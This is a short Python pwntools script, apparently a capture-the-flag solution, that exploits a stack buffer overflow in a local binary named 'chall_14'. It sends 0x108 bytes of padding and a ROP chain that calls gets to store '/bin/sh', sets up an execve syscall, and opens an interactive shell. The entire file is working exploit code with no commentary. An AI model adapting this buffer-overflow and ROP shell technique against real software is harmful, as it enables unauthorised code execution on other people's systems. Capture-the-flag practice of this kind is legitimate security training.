from pwn import *
from sys import argv
syscall = 0x4012d3
writeTo = 0x4c00e0
context.arch="amd64"
p = process("./chall_14")
rop = ROP("./chall_14")
rop.call("gets",(writeTo,))
rop(rax=59,rdi=writeTo,rsi=0)
payload = b'a'*0x108
payload2 = b'/bin/sh\x00'
tstPayload = b'a'*0x108
tstPayload += rop.chain()
tstPayload += p64(syscall)
p.recvline()
p.sendline(tstPayload)
p.sendline(payload2)
p.interactive()
